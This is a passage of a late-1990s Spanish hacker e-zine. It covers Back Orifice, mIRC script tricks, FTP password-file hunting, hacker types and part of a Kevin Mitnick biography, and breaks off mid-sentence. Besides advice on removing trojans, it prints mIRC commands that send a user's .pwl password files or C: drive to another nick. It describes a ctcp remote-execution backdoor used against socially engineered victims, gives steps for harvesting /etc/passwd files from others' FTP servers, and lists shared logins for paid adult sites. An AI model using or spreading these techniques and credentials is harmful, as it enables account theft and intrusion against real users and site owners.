

                 ®®®®®®®®®®®®®®®®®®®®®®®®®
                 ® ZeD-wOrLd-EzInE num.4 ®
                 ®®®®®®®®®®®®®®®®®®®®®®®®®


Una vez mas estoy aqui con todos vosotros,espero que la corta
(al menos en mi opinion) espera que os he hecho sufrir aya merecido
la pena y cojais este nuevo numero con ganas.
Cada vez son mas personas las que colaboran con este vuestro e-zine
(gracias a dios,jeje).
Bueno me dejo de royos y os dejo con los contenidos de este numero 4.
byez.

Si quieres colaborar con el e-zine mandame tu documento en formato TXT a:
                           zed@mixmail.com

Distribuidores oficiles del ezine:
ZeD-wOrLd-----http://www.angelfire.com/ak/HACKZED/ZED2.html
La casa de LordVader-----(web no disponible momentaneamente)
El rincon del Dr.CyBeR----http://personales.mundivia.es/pedroj52
HaCk`S-wEb-RiNg (la web oficial)-----http://come.to/HaCkS-wEb-RiNg


colaboradores de este numero:
ToMaCHeLi--------http://members.tripod.com/~tomacheli
Dr.CyBeR---------http://personales.mundivia.es/pedroj52
[]KHAN[]---------¿?¿?¿?¿?¿?¿?¿¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿?¿

LiNks InTeReSaNtEs-----
http://raregazz.acapulco.uagro.mx (raregazz)
http://come.to/HaCkS-wEb-RiNg  (web oficial del grupo latino HaCk`S-wEb-RiNg)
http://members.tripod.com/~newkers (web del grupo THE NEWKERS)

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
     
          ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®
          ®                 NOTA:                        ®
          ® aunque lo digo en todos los numeros,me gusta ®
          ® repetirlo,todo lo que esta en este,como en   ®
          ® otros numeros atrasados,es meramente         ®
          ® educativo,no incito a nadie a usar lo que se ®
          ® brinda aqui,ademas algunos de estos textos   ®
          ® han sido copiados de otros autores y/o       ®
          ® traducidos por mi,si un texto es tullo y no  ®
          ® quieres que este aqui,dimelo y lo quitare de ®
          ® la edicion de este numero inmediatamente     ®
          ®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®


[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]     


contenidos de este numero------------------------------------------------------------

1.Breve introduccion de el realizador del e-zine (osea yo)
2.Contenidos (osea esto que estas leyendo)
3.Maneras de colarse (y prevenirse) en un HD atraves del IRC (por:ToMACHeLi y ZeD)
4.Uso del FTP para obtener ficheros de password (por el Dr.CyBeR)
5.Tipos de hackers (opinion personal)(por:ZeD)
6.Listado de passwords XxX
7.Historia "del chacal de la red" (Kevin Mitnick)(sacado de RAREGAZZ)
8.Segunda parte del curso de antivirus
9.Hacking a Scytale (por: []KHAN[])
10.Troyanos (Netbus)(por: []KHAN[])
11.Noticias
12.Despedida y cierre 

--------------------------------------------------------------------------------------

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]




                   0101010101010101010101010101010101010101
                   £ MANERAS DE COLARSE (y prevenirse) EN £
                   £       UN HD ATRAVES DEL IRC          £
                   0101010101010101010101010101010101010101
 
                   POR: ToMaCHeLi--(http://members.tripod.com/~tomacheli)

                            Y

                           ZeD------(http://www.angelfire.com/ak/HACKZED/ZED2.html)

                         MIEMBROS DEL HaCk`S-wEb-RiNg--(http://come.to/HaCkS-wEb-RiNg)


ÆÆÆÆÆÆÆÆÆÆÆÆÆÆ
INTRODUCCION Æ
ÆÆÆÆÆÆÆÆÆÆÆÆÆÆ

Devido al creciente aumento de maneras que existen de entrar y/o controlar
computadoras ejenas atraves del irc,nos hemos decidido a escribir este articulo
para la raregazz.
En el trataremos de explicar las formas que hay para introducirse,controlar....
un ordenador de forma remota atraves del irc.
Si quieres comentarnos algo,aqui tienes nuestros mails
ToMaCHeLi----tomacheli@geocities.com
      ZeD----zed@mixmail.com 

ÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆ
FIN D LA INTRODUCCION Æ
ÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆÆ


                BACK ORIFICE.
--------------------------------------

El Back Orifice lo creo no hace demasiado tiempo un grupo de hackers americanos
con el fin de poder entrar en cualquier ordenador sabiendo tan solo la IP del
usuario.
Si te mandan un .EXE    NO LO EJECUTES A MENOS QUE ESTES COMPLETAMENTE SEGURO DE LO QUE
ES.

Muchas personas estan propagando por inet el programa SERVER de
diversas maneras (lo mas extendido es por el IRC). Y aqui entra en papel el
ignorante internauta que se dedica a ejecutarlo en su maquina creyendo que
que es un autoextractor de fotos X :). Una vez ejecutado ¡SORPRESA!, el
archivo desaparece ¿?¿?¿? otia ¿?¿?¿?, y la pobre victima piensa, (bah, me 
habra llegado defectuoso el archivo), y no le da importancia.
Si, pues chaval FELICIDADES acabas de meter un troyano en tu sistema
:), cualquiera que sepa tu IP podra hacer en tu PCera casi lo que le de la
gana. Tas cubierto de gloria :)) (mas bien de mierda que OTROS te han tirao
encima).

El troyano en cuestion funciona de la siguiente manera:
cuando ejecutas el .EXE este instala un programa que se llama (espacio).exe
y borra el ejecutable que te han pasado.
Cada vez que reinicies tu windo2 (solo funciona en este sistema)el troyano se 
auntoinstalara y se cargara en memoria (osea que olvidate de borrar el archivo
(espacio).exe,por que no funcionara).
El troyano deja abierto un puerto en tu sistema LIBRE DE CUALQUIER PROTECCION.
este es un puerto llamado "31173" (sin comillas)(31173=elite)
Atraves de un programa que debe tener la persona que quiere acceder a tu computadora,
este accedera directamente a tu c:\ atraves de unos comandos muy simples,pudiendo
hacer lo que le de la gana dentro de tu ordenador,subir y bajar archivos,abrir
mas puertos,ajecutar programas,incluso formatear el disco duro.
Si notas que te esta pasando alguna de estas cosas lo que puedes hacer es lo 
siguiente:
desconectate de internet y procede a borrar el troyano de la siguiente manera:

Pa que lo pilles rapido, el archivo se mueve del directorio donde esta y va a
parar al directorio :\windows\system convertido en (espacio).exe y ademas en
el editor registros (REGEDIT), carpeta RunServices (puede ser que este en 
otra carpeta) se incorpora la siguiente linea en DATOS: "(espacio).exe", para
que nada mas arrancar el ventanucos el troyano quede en memoria. Y diras 
bah, pos entonces borro el archivo (espacio).exe y yasta.
        Si hijo si, prueba y veras, ni flowers, al tenerlo en memoria no deja
borrarlo. Y entonces??, a jodese jejeje.
        NO, TRANQUILO HAY UNA SOLUCION (por lo menos a mi me va).
        Pero eso te lo dire mas adelante, ahora sigue leyendo....


¿Como puedo saber si tengo el troyano en el sistema?
----------------------------------------------------
        La manera mas facil que hay es utilizar el programa CLIENT (cliente)
apuntando a la direccion IP 127.0.0.1 que es tu propia maquina, no se precisa
que estes conectado a inet. Cuando ya hallas apuntado a esta IP, desde el
cliente de BO manda un PING, si no te responde nada, vale estas limpio y no
tienes el troyano, pero si te pone algo como esto:

------- Packet received from 127.0.0.1 port 31337 -------
  !PONG!1.20!DEFAULT!
------- End of data -------

Opssss, estas jodio, tan colao el troyano...

*****************************************************************************

Nota: Si no lo tienes en el sistema puedes metertelo y probar las maravillas
      y putadas que te pueden hacer los demas (haciendotelas a ti mismo) ;)
      y sin ningun peligro al no estar conectado a inet.

*****************************************************************************


Vale lo tengo y estoy muy asustao ¿como coño me lo quito?
---------------------------------------------------------

        Puede que algunos ya lo hallais descubierto, para mi fue facil, la
verdad. Ya sabemos que al ejecutar el archivo del SERVER, este se convierte
en (espacio).exe y va a parar al directorio :\windows\system. (OJO, hay una 
manera de configurar este nombre y es posible que no siempre el troyano sea 
el (espacio).exe) 
        Vale, como he dicho antes si intentas borrarlo, nanai, por que ya
esta en memoria, asi que lo mas normal es pensar que puede haber una linea
donde hace que se ejecute el troyano en el archivo SYSTEM.INI o WIN.INI
al iniciar el ventanucos. Pos fui a buscarlo por alli y NOP nada de nada, lo
siguiente que pense es buscarlo en el editor de registros (REGEDIT), pos
palli voy, en el menu pincho: EDICION/BUSCAR/ pongo (espacio).exe y activo
CLAVES, VALORES y DATOS y ¡TACHAN! en una carpeta llamada RunServices (sigo 
diciendo que puede estar en otra carpeta) aparece en DATOS el nombre del 
archivito ¡YA LO TENEMOS! solo queda eliminar la linea de DATOS para ello 
pincha donde pone el NOMBRE (suele ser (predeterminado)) y eliminalo, (la 
carpeta no la borres) una vez eliminado ya puedes cerrar la ventana del 
editor de registros (Nota: es posible que en la busqueda aparezcan mas 
(espacio).exe pero solo debes borrar el de la carpeta RunServices o otras
en las que pueda estar y sepas que es la que carga el troyano).
        Con todo esto hemos conseguido que la proxima vez que iniciemos el
ventanucos no se cargue en memoria el troyano, con lo que ya podras ir al
directorio :windows\system y borrar el archivo (espacio).exe (no lo vuelvas
a ejecutar o se te metera otra vez en el registro). Y por fin te has librado
del troyano.

Existen programas que dicen borrar este troyano,pero ES MENTIRA la mayoria
(si no todos)llevan alguna clase de virus dentro,osea que cambiaras este 
virus por otro,por lo que no habras logrado mucho :(
         

      SCRIPTS.
-------------------

Para alguien que sepa scripting le puede resultar muy sencillo controlar tu maquina
de forma remota atraves del irc,ya que en algo que puede resultar tan inocente
como una opcion para mandar un privado,puede esconder algun comando para que si
el esta conectado automaticamente le mandes tu preciado archivo de contraseñas o lo
que se le venga en gana en ese momento.
Te recomendamos que pilles algun manual de scripting (en INet los hay a patadas)
te lo empolles y revises el codigo del script que usas abitualmente,no sea que 
resulte que cada vez que pides la lista de canales del servidor donde estes
estes mandando un archivo a una persona que no quieres que lo tenga.
Procura buscar comandos como los siguientes:

/send c:\windows\*.pwl cualquier_nick_que_haya_puesto

/fserve nick_que_haya_puesto 5 c:

o cosas de este estilo que te puedan parecer sospechosas.
Estos comandos pueden estar puestos de la siguiente manera
Ejemplos:

pidiendo la lista de canales:
/list /send c:\windows\*.pwl nick_al_que_llegara_el_archivo

entrando a un canal:
/join #$$?="Entrar en el canal?" /fserve nick_al_que_daras_acceso 5 c:

recibiendo un texto (si ponen una determinada frase/palabra en un canal o privado)
on *:TEXT:!mandameloya*:#:/dcc send archivo_que_quiera_que_le_llegue $nick " $+ %file $+ " 
| /inc %fsendp | ignore -tacu5 $wildsite 

Como puedes ver,estos comandos remotos pueden estar en cualquier sitio del script,
para localizarlos lo mas eficiente es buscarlos en la opcion de STATUS,MENUBAR y REMOTE
ya que es hay donde suele aver mas cantidad de comandos y es donde es mas dificil de 
encontrar el comando remoto que hace que lo pases tan mal cuando estas conectado al irc


    VIRUS DE IRC.
--------------------

Si ya sabemos que esto esta + visto que el tebeo,pero es otra manera +
¿nunca se te ha ocurrido investigar estos famosos "virus"?
pues a mi si,fijate  :o)

Si investigas un poco dentro del "script.ini" veras que lo que hace es lo siguiente:
esta configurado para que cada vez que entres a un canal le mandes a todos los que
estan dentro de ese canal el fichero "script.ini" ¿pero y si reconfiguramos el 
"script.ini" para que en vez de mandarselo a todo el canal solo le mande a una
persona en concreto el famoso "pwl"?
esto no es muy dificil de hacer si revisas el codigo del "script.ini" y cambias unos
pocos parametros (hay que saber algo de scripting).

En el caso del "dmsetup.exe" es algo mas peculiar.
El archivo en cuestion es un binario (un ejecutable),por lo tanto tendras que saber
programar en el lenguaje que esta echo para poder modificarlo a tu gusto.
Detodas maneras el "virus" sin modificar ya es una jodienda de por si,lo que hace
es lo siguiente:

tiene la particularidad de ser "autoejecutable" osea que no hace falta que lo 
clikees tu para que este se instale en tu maquina :(
Modifica algunas lineas del script.ini para que se autoenvie (igual que el "script.ini")
Algunas de las versiones estudiadas actuan con mas particularidad e incluyen
pautas para desconectar a un usuario si recibe la frase "tis to I who seem so sad"
(sin comillas claro).

Crea copias de si mismo en los directorios c:\windows y c:\mirc (precavido el jeje)
Intenta sobreescribir el autoexec.bat para restaurar copias de si mismo cada vez que 
se reinicie la computadora y por si eso fuera poco encima cambia los directorios de
los fserve por c:\mirc lo que puede ser una putada si guardas logs con contraseñas
o algo asi en alguno de los subdiretorios de esta carpeta.

Eliminar estos dos archivos es algo relativamente simple:
para el script.ini:

en la linea donde escribes normalmete en el mirc pon lo siguiente: 
"/unload -rs script.ini" (sin las comillas obviamente)
lo que consigues con esto es descargar de la memoria del programa este archivo,pero cuando 
lo vuelvas a utilizar este se volvera a cargar en memoria,para elimirarlo lo que deves 
hacer cuando descarges de la memoria el archivo es lo siguiente:
donde escribes normalente en el mirc escribe esto: "/removescript.ini" (sin las comillas) 
y ya estara borrado el "virus"
Para el "dmsetup.exe" la cosa cambia un poco:
Cierra todos los programas  que tengas abiertos,localiza todos los dmsetup.exe que tengas 
en tu sistema (con la opcion de buscar del menu "inicio" te sera muy facil) y borralos 
todos,revisa los ficheros "config.sys" y "autoexec.bat" y si tienes dudas sobre alguna 
linea,sustituye ambos por copias de seguridad.
¿Que no tienes una copia de seguridad?¿pero en que estabas pensando cuando el win2 te dijo 
que era recomendable hacer un disco de arranque?
Luego reinicia el equipo y reinstala el mirc,si sigues sufriendo anomalias a la hora hacer 
funcionar este programa reinstala el win2 (hazlo encima del que tienes,no hace falta formatear)


  ATRAVES DE LA LINEA DE COMANDOS.
---------------------------------------

Para esto es necesario que usen ingeniaria social con tigo (no te vamos a explicar lo
que es la ingenieria social por que es algo sobradamente conocido).

Existen una serie de comandos que si los introduces en donde normalmente escribes puedes
dejar que el otro controle tu programa del Mirc o que le des acceso a tu c:\ pudiendo 
hacer los que le venga en gana con el.

/fserve su_nick 5 c:

/fserve= comando para abrirle una sesion de server al otro usuario
su_nick= aqui se pone el nick de la otra persona
5= cantidad de ficheros que puede bajar
c:= directorio a partir del que le das acceso 

Este comando lo que hace es dar acceso completo a tu c:\ (o la carpeta que especifiques)
Podra subir,bajar,borrar...ficheros,la unica restriccion que pones es la carpeta
apartir de la que tiene acceso,y el numero de archivos que puede bajar.
Ademas cuando pones este comando te saldra una ventana (en ingles) diciendote lo que
estas haciendo (pero la mayoria de las veces la gente pasa de leerla)

ctcp 1:*:$1-
Este comando, introducido en los ctcp´s de mIRC, ejecuta cualkier orden 
de forma remota.Es como el antiguo /ctpc nick DO.
ctcp ==> Client-To-Client-Protocol. Los version, ping, etc...
1    ==> nivel de usuario que ejecuta el ctcp.
*    ==> como en DOS, comodin que sustituye al ctcp que nos hagan. Podriamos
definir aqui un VERSION PING, etc..
$1-  ==> con este parametro, mirc toma en consideracion todo lo que nos envien. 

¿Mu bonito verdad? pero te estaras preguntando ¿y como co¤e se usa? pos mu simple:
Hemos conseguido que el pavo introduzca este comando y estamos en el canal
#me_mola con el y me apetece que me de OP en este canal,pues ponemos lo siguiente
"/ctcp su_nick mode #me_mola +o nuestro_nick" (sin comillas)
y bingo,ya tenemos op en el canal #me_mola,pero claro el tio dice "coño si yo a este no
le he dado op" y se mosquea osea que este es un buen momento para hacer un "automass deop"
¿que no sabes como hacerlo? pos en la mayoria de los scripts (un poco modernos)
tienes una opcion para hacerlo, "pero esque yo no uso ningun script"
¿pero tu en que mundo vives tio? en http://www.welcome.to/100scripts tienes una coleccion de
ellos muy grande,bajate alguno + rapido que inmediatamente :) 
(si es el ZeD-wOrLd-ScRiPt mejor,jeje)
"Bueno pero yo no quiero que me de OP lo que quiero es desconectarle del irc"
Bueno pues en ese caso ponlo siguiente:
"/ctcp nick_del_personaje quit FRASE QUE TE APETEZCA QUE DIGA AL DESCONECTARSE" 
(sin las comillas)
"¿Y si quiero que diga algo sin que lo escriba?" pues pon esto:
"/ctcp nick_del_personaje say FRASE QUE QUIERES QUE DIGA" (sin las comillas)
Tienes que tener cuidado con esta clase de "ataques" por que al tio en cuestion
se le llenara la ventana de "status" de mensajes diciendole quien sois.
Bueno supongo que el concepto lo habreis pillado puesto que es muy simple. 

Bueno esto es una peque¤a muestra de como controlar,colarse...etc... atraves de 
algo tan usado como es el irc,pero para muchas de estas cosas tienes que elejir a
alguien que sea un pardillo en esto del irc,pero los hay,valla si los hay ;)

byez  

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]



             ################################################
             ### USO DEL FTP PARA OBTENER FICHEROS PASSWD ###
             ################################################
                   By: DrCyber 
               e-mail: drcyber69@hotmail.com
               WEB: http://personales.mundivia.es/pedroj52

                Al acceder a un servidor via FTP, lo que hace este servidor
es darnos los ficheros que contiene, y entre todos esos ficherillos esta el
mas buscado, el fichero de passwd.
        Como ahora no hay ""objetivo"" a la vista de nuestros ojos, puedes
buscar uno en el siguiente buscador: http://ftpsearch.ntnu.no  esta es la WEB
del Fast FTP Search v3.7, bueno pues escribid en la casilla de "search for"
el fichero a buscar, (podeis probar a escribir passwd) y pulsad sobre "search"
hay teneis un monton de ficheros, estudiadlo detenidamente, y daros cuenta que
hay teneis ficheros, directorios etc.
Los tipos de ficheros pueden ser:

-: file  (fichero)
d:  (directorio)

A partir de si es fichero o directorio, empezamos con los permisos de usuario,
los permisos pueden ser:

r: Readable (Lectura)
w: Writeable (escritura)
x: eXcutable (ejecutable)

Bueno ahora volvemos atras con nuestra navegata y escribimos lo mismo de antes
pero en la casilla de "limit to path" escribimos "etc" (no comillas claro. 8-D)

¨ Para que ?
de este modo nos va a buscar los ficheros passwd del directorio etc.
pero claro, atencion, el directorio etc colgara del raiz ¨ verdad ?
NO PROBLEMO....
Vamos a afinar la busqueda, volvemos al navegata y por ejemplo le vamos a decir
que nos busque dentro de Francia, para ello, en la casilla "limit to domain"
escribimos fr, de esta forma en el nombre del servidor ha de aparecer fr, que
corresponde a los servidores Franceses (digo Gabachos.. 8-D)
y ahora con lo que nos salga -- Bingo !! Ya tenemos el fichero passwd en su
lugar correcto, bien, ahora probemos probemos a ver lo que contienen.....
Si las claves del fichero estan shadow despedoiros de ese servidor, pero eso
es que el fichero elegido ocupa poco, busca los que mas ocupen, asi la info
sera mas jugosilla, cuando pilles el fichero que te ineterese, grabalo a tu
HD, y no se te olvide apuntar la url del servidor de donde salio...

        Bueno esto es todo, recordad que todo esto es mera informacion, con
        ello no se incita a nadie a llevar a cabo actos delictivos o que le
        pueden traer problemas, el autor no se hace responsable de nada...

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]



                        æææææææææææææææææææ
                        ¤ TIPOS DE HACKERS¤
                        æææææææææææææææææææ

documento escrito por ZeD.
Puedes subir este documento a tu web,bbs,ftp.....
siempre y cuando mantengas este encabezado
¿dudas?¿comentarios?¿sujerencias?
zed@mixmail.com

http://www.angelfire.com/ak/HACKZED/ZED2.html
miembro del HaCk`S-wEb-RiNg (http://come.to/HaCkS-wEb-RiNg)

------------------------------COMIENZA EL TEXTO-------------------------------------------------

Bueno puede que alomejor esto no sea lo que esperes que sea,me explico.
Existen muchos documentos explicando las diferencias que existen entre
un hacker,un carcker....¿pero te has parado a pensar las clases de hackers
que hay?.
Pr que aunque no lo creas,dentro del mundo del hacking existen muchos tipos
de hackers,no todos se dedican a entrar en sistemas.
(que conste que este documento es una opinion propia,cada uno que piense lo 
que quiera)

En mi opinion lostipos que exsisten son los siguientes:

hackers:
son los quetodoel mundo conoce y admira,las personas que tienen la "facilidad"
de entrar donde quieran para aprender de ese sistema,copiar archivos 
(nunca destruirlos),y luego (la mayoria lo hacen) informar al responsable
del sistema de los fallos que tiene.

hackers de SOs:
los hackers de SOs se dedican a averiguar todos los trucos,secretos,fallos....
de un sistema oprativo.
puedes pensar lo siguiente -si solo se limitana eso... ¿que es lo que hackean?-
la respuesta es simple,¿acaso hackear no es averiguar lo + posible del sistema
para poder saber los fallos que tiene,para poder entrar?.
bien pues creo que te he contestado a tu pregunta ¿no?
ademas,sacr los trucos del SO para personalizarlo al maximo,es una manera
de trucar el sistema,por lo tanto HACKEARLO.

hackers de IRC:
eston la mayoria de las veces son lo que llamamos lamers.
la gran parte de las veces esto es cierto,pero no siempre.
en mi opinion un hacker de IRC,es alguien que sabe conseguir lo que se proponga
siempre y cuando este dentro de este mundo; contraseñas,op,acceder a otra computadora
+ de lo que le permite ese usuario....

en mi opinion a los que se dedican a este mundo (que al fin y al cabo no esta tan alejado
del mundo del hacking) no deveria de considerarseles LAMERS,puesto que hay que aprender
muchos comandos,tacticas,trucos y sobre todoconocer los fallos que puedan tener,
sino todos,la mayoria de los scripts que circulan por la red.
con estonoestoy defendiendo a los lamers,pero tampoco les critico
son jente que aun queriendo ser un hacker,les gusta que se lo den todo echo,
estola gran parte de las veces es devido a que en el mundo de la informatica
han crecido con el win2 o sea "instalar y listo",a esa jente les recomiendo
que se expandan,que dejen un poco de lado al win2 y se instalen LINUX
para que vean que en el mundo de la informatica,no todo es PUG & PLAY.

hackers programadores:
que te creias¿que todos los que hacen programas para hackear o crackear,entran en sistemas?
pues no amiguito mio :) de eso nada
muchos de los programadores que hacen programas para averiguar claves,escanear puertos,
crear diccionarios....etc,no los usan simplemente hacen los programas (aunque suene raro 
es asi)


Bueno pues esto son solo algunos ejemplos para quete hagas a la idea de que,en el mundo del
hacking,no todo es entrar en un sistema,se pueden hacer muchas otras cosas que sin
duda(al menos para mi) ayudan mucho a este mundo en constante desarroyo
Aunque ultimamente parece estar de moda ser hacker,aprender a entrar en ordenadores para
borrar archivos y meter virus,las cosas no son asi.
Si de verdad quieres ser un hacker,no hace falta que entres en un sistema y le formatees
el HD con un troyano para que yo te considere un hacker,al contrario para mi esa jente
son los DELINCUENTES que dan mala fama a las personas que entran,miran y se van
y asa jente es a la que yo llamo DELINCUENTE,por que en el fondo lo son,si deverdad quieres ser
un hacker no hagas cosas que produzcan desastres en computadoras,es mas priductivo
que informes al administrador del sistema de los fallos que tiene y con eso ganaras 
como minimo mi respeto y seguro que el de mucha mas jente que opina como yo.

Con esto no pretendo convencer a nadie,simplemente es una opinion reflejada en un documento
que puede servir para que mucha jente se de cuenta,que hay mucha diferencia entre un 
hacker y otro,aunque a ambos se les llame igual,muchas veces no los son.
----------------------------FINALIZA EL TEXTO----------------------------------------------------
ZeD
http://www.angelfire.com/ak/HACKZED/ZED2.html
miembro del HaCk`S-wEb-RiNg (http://come.to/HaCkS-wEb-RiNg)
 
[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]



               {{{{{{{{{{PASWORDS XxXxXxX}}}}}}}}}}}}}}}

NOTA:si alguno de estos passwords falla,no te extrañes,las contraseñas las cambian muy 
amenudo,por lo tanto no me mandes e-mails dciendome que las direccion no funcionan


http://www.lovezoo.com/members/zoo/
login:bimbo
pass:bimbo

http://www.shockingteens.com/members/shockingteens/
login:batcave
Pass:batcave

http://www.100sex.com/members/showcase/showcase2.html
L:access P:hyt66 ver:Sep 19, 98

http://www.111sexstreet.com/private/sex02.html 
L:youcantget P:ridofagentx ver:Sep 19, 98

http://www.111sexstreet.com/private/sex02.html L:gigi P:1234 ver:Sep 19, 98 

http://www.111sexstreet.com/private/sex02.html L:rrrr P:rrrr ver:Sep 19, 98 

http://www.18hardcore.com/MEMBERS/mpics/barely18.htm L:none P:none ver:Sep 19, 98

http://www.200pix.com/members/ L:guest P:guest ver:Sep 19, 98 

http://www.200pix.com/members/ L:test P:account ver:Sep 19, 98 

http://www.2sexy.com/members/membersindex.html L:madeline P:madeline ver:Sep 19, 98

http://www.40plus50plus.com/members/news.html L:alonso P:alonso ver:Sep 19,98

http://www.69time.com/hardsex/index.html L:bobbijo P:bobbijo ver:Sep 19, 98 

http://www.adrianna.com/private/gallery.htm L:alley P:cat ver:Sep 19, 98 

http://www.adult-perversions.com/members/ L:godflesh P:coolie292 ver:Sep 19, 98

http://www.adult-perversions.com/members/ L:dera123 P:towed972 ver:Sep 19, 98 

http://www.adult-perversions.com/members/ L:younger P:editor563 ver:Sep 19,98

http://www.allthatass.com/private-club/allthatass-index.html L:deep P:throat ver:Sep 19, 98

http://www.angelsweb.com/members/mmain.htm L:qwerty P:ytrewq ver:Sep 19, 98 

http://www.aphouse.com/frames/subscribers/sub_index.html L:nikki P:nikki ver:Sep 19, 98

http://www.aphouse.com/frames/subscribers/sub_index.html L:aaaaa P:aaaaa ver:Sep 19, 98

http://www.appetite4sex.com/members/index.html L:topgun P:topgun ver:Sep 19, 98

http://www.appetite4sex.com/members/index.html L:elvis P:elvis ver:Sep 19, 98 

http://www.ayana.com/private/ L:frown P:mom ver:Sep 19, 98 

http://www.backdoorbimbos.com/members/index.html L:anonymous P:anonymous ver:Sep 19, 98

http://www.backdoorbimbos.com/members/index.html L:bim P:bo ver:Sep 19, 98 

http://bserver.amkingdom.com/protected/mea1x.htm L:evan P:nine ver:Sep 19, 98 

http://www.bunsoffun.com/members/index.html L:new P:spanky ver:Sep 19, 98 

http://www.califbodies.com/members/index.html L:xxlustyxx P:lusty ver:Sep 19, 98

http://www.celebritypornostars.com/private/gallery.html L:marzbarz P:fastporn ver:Sep 19, 98

http://www.celebritypornostars.com/private/gallery.html L:letmein P:letmein ver:Sep 19, 98

http://www.centerfoldgold.com/members/index.shtml L:billy P:billy ver:Sep 19, 98

http://www.centerfoldgold.com/members/index.shtml L:55555 P:12345 ver:Sep 19, 98

http://www.hornybitches.com/payed L:peru P:peru ver:Sep 19, 98 

http://hot4you.netaxs.com/members L:gary P:mysmut ver:Sep 19, 98 

http://www.hotbody.com/members L:good4 P:1234 ver:Sep 19, 98 

http://www.hotbody.com/members L:good6 P:1234 ver:Sep 19, 98 

http://www.hotbody.com/members L:good5 P:1234 ver:Sep 19, 98 

http://www.inter-racial.com/membersdmr/ L:eric P:eric ver:Sep 19, 98 

http://www.inter-racial.com/membersdmr/ L:scott P:scott ver:Sep 19, 98 

http://www.inter-racial.com/membersdmr/ L:raven P:raven ver:Sep 19, 98 

http://www.internationalspice.com/members/ L:rammelzee P:dondi ver:Sep 19, 98 

http://www.itsreal.com/members/ L:1 P:1 ver:Sep 19, 98 

http://www.itsreal.com/members L:patti P:patti ver:Sep 19, 98 

http://www.itsreal.com/members L:special1 P:special ver:Sep 19, 98 

http://www.itsreal.com/members/ L:micky P:micky ver:Sep 19, 98 

http://www.itsreal.com/members/ L:doggie P:doggie ver:Sep 19, 98 

http://www.itsreal.com/members/ L:noah P:noah ver:Sep 19,98 

http://www.itsreal.com/members L:haze P:haze ver:Sep 19, 98 

http://www.itsreal.com/members/ L:elle P:elle ver:Sep 19,98 

http://www.itsreal.com/members/ L:cola P:cola ver:Sep 19,98 

http://www.itsreal.com/members/ L:pablo P:pablo ver:Sep 19, 98

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]

                     ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
                     ³                                  ³
                     ³ La Historia del Chacal de la Red ³
                     ³                                  ³
                     ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

       NOTA DE LA REDACCION (osea de ZeD):
Este texto lo he bajado de la web oficial de RAREGAZZ,a la cual podeis hacceder
desde esta direccion:
http://raregazz.acapulco.uagro.mx



 Como Hacker la carrera de Kevin Mitnick comenzo a los 16 años, cuando
 -obsesionado por las redes de computadoras- rompio la seguridad del sistema
 administrativo de su colegio.

 Escrito por: Gilberto Pagua

 Mr. Mitnick.

 Todo aquel que sea conceptualizado como un Internauta se caracteriza por
 utilizar un telefono, un modem y una computadora para muchos fines
 diferentes: Divertirnos, informarnos, estudiar, cocinar, planificar viajes
 y otras actividades que amplian nuestro quehacer diario. Para Kevin Mitnick
 el quehacer diario en sus ultimos diez años fue el explorar y "explotar"
 computadoras ajenas y sistemas telefonicos. ¿Su profesion? "Hacker" de
 nacimiento.

 Este "terrorista electronico", como lo cataloga el Departamento de Justicia
 de los Estados Unidos, conocido en los medios como el "Condor", fue capaz de
 crear numeros telefonicos imposibles de facturar (para la compañia
 telefonica el era James Bond, con un numero que terminaba en 007), pudo
 apropiarse de 20.000 numeros de tarjetas de credito de habitantes de
 California y burlarse del FBI por mas de dos años con solo un telefono
 celular alterado y un computador portatil.

 Es la peor pesadilla de las empresas de telefonia. Es sospechoso de robar el
 software de mas de media docena de fabricantes de telefonos celulares y
 tenia el control de tres oficinas centrales de telefonos en Manhattan y de
 todos los centros de conmutacion de California, dandole la habilidad de
 escuchar cualquier conversacion telefonica o, si no eras una persona de su
 agrado, modificar el telefono de tu casa de tal manera que, cada vez que
 levantaras el auricular, una grabadora pedia que depositaras 25 centavos.

 ¿Como se forma un Hacker?

 Como Hacker, la carrera de Mitnick tiene sus inicios en 1980 cuando apenas
 contaba 16 años y, obsesionado por las redes de computadoras, rompio la
 seguridad del sistema administrativo de su colegio, pero no para alterar sus
 notas, lo hizo "solo para mirar". Su bautizo como infractor de la ley fue en
 1981. Junto a dos amigos entro fisicamente a las oficinas de COSMOS de
 Pacific Bell. COSMOS (Computer System for Mainframe Operations) era una base
 de datos utilizada por la mayor parte de las compañias telefonicas
 norteamericanas para controlar el registro de llamadas. Una vez dentro de
 las oficinas obtuvieron la lista de claves de seguridad, la combinacion de
 las puertas de acceso de varias sucursales y manuales del sistema COSMOS. La
 informacion robada tenia un valor equivalente a los 200 mil dolares. Fueron
 delatados por la novia de uno de los amigos y debido a su minoria de edad
 una Corte Juvenil lo sentencio a tres meses de carcel y a un año bajo
 libertad condicional.

 Luego de cumplido el periodo de tres meses el oficial custodio encargado de
